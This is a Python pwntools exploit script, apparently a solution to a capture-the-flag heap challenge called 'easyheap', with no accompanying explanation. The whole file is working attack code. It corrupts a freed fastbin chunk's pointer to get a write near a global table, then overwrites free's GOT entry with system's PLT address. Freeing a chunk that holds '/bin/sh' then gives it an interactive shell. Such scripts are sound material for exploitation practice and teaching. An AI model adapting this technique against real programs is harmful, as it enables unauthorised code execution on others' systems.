from pwn import *

p = process("./easyheap")
elf = ELF("easyheap")

def create(size, payload):
    p.sendlineafter("choice :", str(1))
    p.sendlineafter("Heap : ", str(size))
    p.sendlineafter("heap:", payload)

def edit(idx, payload):
    p.sendlineafter("choice :", str(2))
    p.sendlineafter("Index :", str(idx))
    p.sendlineafter("Heap : ", str(len(payload)+1))
    p.sendlineafter("heap : ", payload)

def delete(idx):
    p.sendlineafter("choice :", str(3))
    p.sendlineafter("Index :", str(idx))

create(0x60, b"A")
create(0x60, b"A")
create(0x60, b"A")

delete(2)

payload = p64(0) * 13 + p64(0x71) + p64(0x6020ad)
edit(1, payload)

create(0x60, b"/bin/sh\x00")
create(0x60, b"A")

payload = b"A" * 3 + p64(0) * 4 + p64(elf.got["free"])
edit(3, payload)

payload = p64(elf.plt["system"])
edit(0, payload)

delete(2)

p.interactive()